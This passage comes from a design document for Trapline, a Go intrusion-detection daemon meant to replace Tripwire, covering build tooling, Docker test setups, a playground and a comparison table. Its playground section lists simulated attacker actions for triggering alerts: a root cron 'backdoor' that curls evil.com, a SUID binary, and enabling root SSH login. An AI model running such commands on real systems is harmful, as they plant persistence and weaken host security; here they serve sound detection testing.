That's it. 20 lines of Ansible instead of 60. The binary does all the work — Ansible just puts it there, drops the config, and tells it to rebaseline after deploys. After the first install, `trapline update` handles future binary updates itself (self-update from GitHub). Ansible only needs to manage the config template.

Compare to the current Tripwire setup: `tripwire.yml` (50 lines), `tripwire_init.yml`, key generation, policy signing, debconf pre-seeding, cron script with exit code handling... all gone.

### Migration Path (Tripwire -> Trapline)

1. Deploy Trapline alongside Tripwire (both running)
2. Verify Trapline findings are landing in Axiom
3. Disable Tripwire cron: `chmod -x /etc/cron.daily/tripwire`
4. Monitor for 1 week — confirm Trapline catches what matters
5. Remove Tripwire: `apt: name=tripwire state=absent`
6. Delete `tripwire.yml`, `tripwire_init.yml`, `files/tripwire/` from Ansible

---

## Future Modules

These are not in v1 but the module interface makes them trivial to add:

| Module | What | Why Later |
|---|---|---|
| `firewall` | Parse UFW/iptables rules, alert on changes | Low priority — rules rarely change |
| `dns` | Monitor `/etc/resolv.conf` and test resolution | Edge case |
| `certificates` | TLS cert expiry monitoring | Traefik/Let's Encrypt handles this |
| `login` | Monitor auth.log for brute force / successful logins from new IPs | Overlaps with Fluent Bit auth.log forwarding to Axiom |
| `kernel` | Monitor loaded kernel modules, sysctl changes | Advanced threat detection |
| `network` | Outbound connection monitoring (detect C2 beacons) | Requires eBPF, significant complexity |
| `rootkit` | chkrootkit/rkhunter-style checks | ClamAV partially covers this |

---

## Build & Development

### Tooling: mise

All project tooling is managed with [mise](https://mise.jdx.dev/). A single `mise install` sets up everything needed to build, test, and release.

```toml
# mise.toml
[tools]
go = "1.23"
goreleaser = "2"
golangci-lint = "1"
cosign = "2"

[tasks.build]
run = "go build -o trapline ./cmd/trapline"

[tasks.test]
run = "go test ./..."

[tasks.test-integration]
description = "Run integration tests in Docker (Linux environment)"
run = "docker compose -f dev/docker-compose.test.yml run --rm integration"

[tasks.lint]
run = "golangci-lint run ./..."

[tasks.snapshot]
description = "Build release binaries locally (no publish)"
run = "goreleaser release --snapshot --clean"

[tasks.dev]
description = "Build and run locally in dev mode"
run = "go build -o trapline ./cmd/trapline && ./trapline run --config dev/trapline.yml"

[tasks.playground]
description = "Build, deploy to Ubuntu container, install & start trapline"
run = """
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o dist/trapline ./cmd/trapline \
  && docker compose -f dev/docker-compose.playground.yml up --build -d \
  && echo '' \
  && echo 'Trapline playground is running.' \
  && echo '  Shell in:       docker exec -it trapline-playground bash' \
  && echo '  Watch findings: docker logs -f trapline-playground-sink' \
  && echo '  Rebuild:        mise run playground' \
  && echo '  Tear down:      mise run playground-down'
"""

[tasks.playground-down]
description = "Stop and remove playground containers"
run = "docker compose -f dev/docker-compose.playground.yml down -v"
```

Contributors clone the repo, run `mise install`, and everything works. No "install Go 1.23, then install goreleaser, then..." instructions.

### Developing on macOS, Targeting Linux

Trapline is Linux-only (reads `/proc`, uses `systemd`, calls `dpkg`). Development happens on macOS. This works because of a clean separation:

- **Unit tests** — run anywhere. All `/proc` and `/sys` reads are behind interfaces that are faked in tests. `mise run test` works on macOS.
- **Integration tests** — run in Docker. A lightweight Debian container exercises the real Linux codepaths: `/proc/net/tcp`, `dpkg --verify`, file permissions, SUID detection, etc.
- **Build** — `CGO_ENABLED=0 GOOS=linux` cross-compiles from macOS. `mise run snapshot` produces the same binaries that CI does.

### Docker Integration Test Environment

```yaml
# dev/docker-compose.test.yml
services:
  integration:
    build:
      context: ..
      dockerfile: dev/Dockerfile.test
    volumes:
      - ..:/src:ro
      - go-cache:/root/.cache/go-build
      - go-mod:/root/go/pkg/mod
    tmpfs:
      - /var/lib/trapline
      - /var/log/trapline
      - /etc/trapline
    privileged: false
    security_opt:
      - no-new-privileges:true

volumes:
  go-cache:
  go-mod:
```

```dockerfile
# dev/Dockerfile.test
FROM golang:1.23-bookworm

# Install packages trapline needs to interact with
RUN apt-get update && apt-get install -y --no-install-recommends \
    openssh-server \
    cron \
    sudo \
    && rm -rf /var/lib/apt/lists/*

# Pre-populate dpkg database so packages module has something to verify
# Create test users, cron jobs, SUID binaries, etc.
COPY dev/testdata/setup-test-env.sh /setup.sh
RUN chmod +x /setup.sh && /setup.sh

WORKDIR /src
CMD ["go", "test", "-tags", "integration", "-v", "./..."]
```

The test container:
- Has a real dpkg database, real `/proc`, real `/etc/passwd` — no faking
- Caches Go modules and build artifacts across runs (fast iteration)
- Uses `tmpfs` for trapline state — clean slate every run, no disk pollution
- Runs unprivileged where possible (some module tests need capabilities, granted per-test)

The `integration` build tag keeps these tests out of `mise run test` (fast macOS unit tests) and into `mise run test-integration` (slower but thorough Linux tests).

```bash
# Quick feedback loop on macOS
mise run test                 # unit tests, seconds

# Full Linux integration tests
mise run test-integration     # Docker, ~30s first run, ~10s cached

# Build release binaries locally
mise run snapshot             # goreleaser --snapshot
```

### Playground — Live Ubuntu Environment

`mise run playground` cross-compiles the binary, drops it into a fresh Ubuntu container, runs `trapline install`, and starts the service. You get a live Linux environment to poke at — add users, modify files, start rogue processes, and watch Trapline react in real time.

The playground uses an aggressive config with fast scan intervals so you see results immediately:

```yaml
# dev/playground/trapline.yml
# Playground config — fast intervals for interactive testing

state_dir: /var/lib/trapline

output:
  console:
    enabled: true
    format: text            # human-readable for playground
    level: info             # show everything
  tcp:
    enabled: true
    address: sink:9999      # dummy TCP sink in the compose stack
    format: json
    level: info

defaults:
  interval: 10s             # aggressive — everything scans fast
  cooldown: 30s             # short cooldown so repeat findings show up quickly

modules:
  file-integrity:
    enabled: true
    interval: 5s
  packages:
    enabled: true
    interval: 30s
  ports:
    enabled: true
    interval: 5s
  processes:
    enabled: true
    interval: 5s
  users:
    enabled: true
    interval: 10s
  cron:
    enabled: true
    interval: 10s
  suid:
    enabled: true
    interval: 30s
  ssh:
    enabled: true
    interval: 10s
  permissions:
    enabled: true
    interval: 30s
  containers:
    enabled: false          # no Docker-in-Docker in playground
```

```yaml
# dev/docker-compose.playground.yml
services:
  trapline:
    container_name: trapline-playground
    build:
      context: ..
      dockerfile: dev/Dockerfile.playground
    volumes:
      - ./playground/trapline.yml:/etc/trapline/trapline.yml:ro
    init: true
    depends_on:
      - sink
    tty: true

  sink:
    # Dummy TCP server — receives JSON findings and prints them to stdout.
    # `docker logs -f trapline-playground-sink` to watch findings stream in.
    container_name: trapline-playground-sink
    image: alpine:3
    command: ["sh", "-c", "apk add --no-cache socat && echo 'Listening for findings on :9999...' && socat -u TCP-LISTEN:9999,reuseaddr,fork STDOUT"]
    expose:
      - "9999"
```

```dockerfile
# dev/Dockerfile.playground
FROM ubuntu:24.04

# Real Ubuntu environment — systemd, dpkg, the works
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && apt-get install -y --no-install-recommends \
    systemd systemd-sysv \
    openssh-server \
    cron \
    sudo \
    curl \
    net-tools \
    procps \
    && rm -rf /var/lib/apt/lists/*

# Copy the freshly-built binary
COPY dist/trapline /usr/local/bin/trapline
RUN chmod 755 /usr/local/bin/trapline

# Install trapline (creates dirs, config skeleton, systemd unit)
# Config will be overridden by the volume mount
RUN trapline install --no-start

# Start systemd as PID 1 so trapline's systemd unit works
STOPSIGNAL SIGRTMIN+3
CMD ["/sbin/init"]
```

#### Using the playground

```bash
# Start it
mise run playground

# Shell in — you're root in a real Ubuntu environment
docker exec -it trapline-playground bash

# Watch findings stream into the TCP sink (another terminal)
docker logs -f trapline-playground-sink

# Poke at the system and watch Trapline react:
useradd -m hacker                       # → user-added finding in ~10s
echo "* * * * * root curl evil.com" > /etc/cron.d/backdoor   # → cron-added
chmod 4755 /tmp/escalate                # → suid-unexpected
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config           # → ssh-insecure-setting
python3 -m http.server 8080 &          # → port-new finding in ~5s

# Check trapline's own view
docker exec trapline-playground trapline status
docker exec trapline-playground trapline findings --format table

# Rebuild after code changes (fast — just recompiles and restarts)
mise run playground

# Done
mise run playground-down
```

The TCP sink is intentionally dumb — just `socat` printing JSON lines to stdout. It simulates what Fluent Bit would receive in production. `docker logs -f trapline-playground-sink` gives you a live stream of every finding as it fires, formatted as the JSON that would flow to Axiom.

### Dependencies (Minimal)

- `fsnotify` — config file watching
- `gopkg.in/yaml.v3` — YAML config parsing
- `github.com/coreos/go-systemd/v22/daemon` — sd_notify for watchdog
- Standard library for everything else (crypto/sha256, net, os, encoding/json)

No CGO. Static binary. Cross-compile for amd64/arm64 trivially.

---

## Summary

| Concern | Tripwire | Trapline |
|---|---|---|
| Scan mode | Daily cron job | Continuous daemon, per-module intervals |
| Output | Email wall of text | Structured JSON -> Fluent Bit -> Axiom |
| After apt upgrade | 4,000 findings, needs manual DB rebuild | Zero findings (dpkg-aware, auto-rebaseline via apt hook) |
| After Ansible deploy | Needs `tripwire --init` | Auto-rebaseline via `trapline rebaseline` at end of playbook |
| Docker awareness | Crawls overlay filesystems, slow and noisy | Monitors container inventory and compose files, ignores overlays |
| Process monitoring | None | Allowlist/denylist with resource alerts |
| Configuration | Cryptographically signed policy files | YAML in /etc, hot-reload on change |
| Updates | apt (when you remember) | Self-update from GitHub releases with cosign verification |
| Install | apt install + debconf + key generation + policy signing | `./trapline install` — done |
| Uninstall | Manual cleanup of keys, policies, cron, config, database | `trapline uninstall` — everything gone |
| Troubleshooting | Read the man page, good luck | `trapline doctor` — tells you what's wrong and how to fix it |
| Time to value | Days of policy tuning | `curl + install` — two commands, learning mode, immediate |
